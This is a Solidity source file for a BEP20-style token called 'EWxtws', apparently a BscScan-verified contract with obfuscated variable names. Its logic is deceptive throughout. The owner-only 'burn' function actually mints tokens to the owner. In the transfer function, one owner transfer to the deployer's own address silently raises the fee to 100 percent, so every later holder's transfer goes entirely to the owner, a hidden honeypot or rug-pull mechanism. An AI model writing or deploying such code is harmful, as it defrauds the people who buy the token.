/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13
 */
pragma solidity >=0.4.11;
contract WWipIl {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  dpXHqx = 100000000000000000000000;
uint256 public  jqJuyO = 10000000000000000;
address public  IenaaC = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  rFIeDB = address(0);
mapping (address => uint256) public balanceOf;
address public  LSJyeP = address(0);
string public  symbol = "FfYVgE";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  rDMQMy = 10000000000000000000000000000;
address public  sdpxer = address(0);
uint256 public  lpArkB = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  bgQIWx = 10000000000000;
uint256 public  CLeJkz = 100000000000000000;
uint256 public  qfZCSX = 10000000000000000000;
address public  swIkzP = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  zdykZC = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
uint256 public  IzOTPf = 100000000000000000000;
string public  name = "EWxtws";
address private  CnrPwv = address(0);
address public  OEBesJ = address(0);
address public owner;
uint256 public constant BfwkrP = 9+1;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "qIInvp");
require(to != address(0), "qIInvp");
require(amount <= balanceOf[from], "qIInvp");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BfwkrP/bgQIWx ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==CnrPwv){
bgQIWx = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
CnrPwv = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}